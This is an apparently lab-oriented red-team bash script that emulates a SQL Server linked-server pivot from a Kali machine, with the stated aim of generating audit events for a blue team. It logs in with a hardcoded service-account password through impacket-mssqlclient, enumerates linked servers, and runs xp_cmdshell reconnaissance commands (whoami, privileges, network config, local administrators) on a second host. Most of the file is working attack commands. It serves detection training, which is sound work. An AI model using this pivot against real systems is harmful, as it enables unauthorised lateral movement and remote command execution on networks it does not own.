#!/bin/bash
# ============================================================
# TTP2: SQL Linked Server Pivot (SRV02-DB → SRV03-APP)
# MITRE: T1021 — Remote Services
# MITRE: T1059.003 — Command and Scripting: Windows Command Shell
# APT28 Ref: Database exploitation for lateral movement
# ============================================================
# PURPOSE: Generates SQL audit events on SRV02-DB, Event 4688
#          on SRV03-APP (cmd.exe from sqlservr.exe).
# RUN FROM: Kali (attacker machine)
# PREREQ: svc_db:Db@ccess2025! from TTP1
# ============================================================

set -o pipefail
DOMAIN="cyberange.local"
TOOLS="/opt/redteam"
LOOT="$TOOLS/loot"
SRV02="${1:?Usage: $0 <SRV02-DB_FQDN_or_IP>}"

echo "[*] TTP2: SQL Linked Server Pivot — T1021 / T1059.003"
echo "[*] Target: $SRV02"

echo ""
echo "[*] Phase 1: Connecting to MSSQL as svc_db..."
cat > "$TOOLS/ttp2_recon.sql" << 'SQL'
SELECT @@servername AS [Current Server];
SELECT name FROM sys.databases;
SELECT name, data_source, is_linked FROM sys.servers WHERE is_linked = 1;
SQL

impacket-mssqlclient "cyberange.local/svc_db:Db@ccess2025!@$SRV02" -windows-auth \
    -file "$TOOLS/ttp2_recon.sql" 2>&1 | tee "$LOOT/ttp2_recon.txt"
sleep 2

echo ""
echo "[*] Phase 2: Testing linked server xp_cmdshell on SRV03-APP..."
cat > "$TOOLS/ttp2_pivot.sql" << 'SQL'
EXEC ('xp_cmdshell ''whoami''') AT [SRV03-APP];
EXEC ('xp_cmdshell ''whoami /priv''') AT [SRV03-APP];
EXEC ('xp_cmdshell ''hostname''') AT [SRV03-APP];
EXEC ('xp_cmdshell ''ipconfig''') AT [SRV03-APP];
EXEC ('xp_cmdshell ''net localgroup Administrators''') AT [SRV03-APP];
SQL

impacket-mssqlclient "cyberange.local/svc_db:Db@ccess2025!@$SRV02" -windows-auth \
    -file "$TOOLS/ttp2_pivot.sql" 2>&1 | tee "$LOOT/ttp2_pivot.txt"

echo ""
echo "[+] TTP2 Complete."
echo "[+] Blue team: check SRV02-DB SQL audit log for:"
echo "    - EXEC AT [SRV03-APP] statements"
echo "    - xp_cmdshell calls routed through linked server"
echo "[+] Blue team: check SRV03-APP Security log for:"
echo "    - Event 4688 — cmd.exe spawned by sqlservr.exe (parent PID)"
echo "[+] Artifacts: $LOOT/ttp2_*"
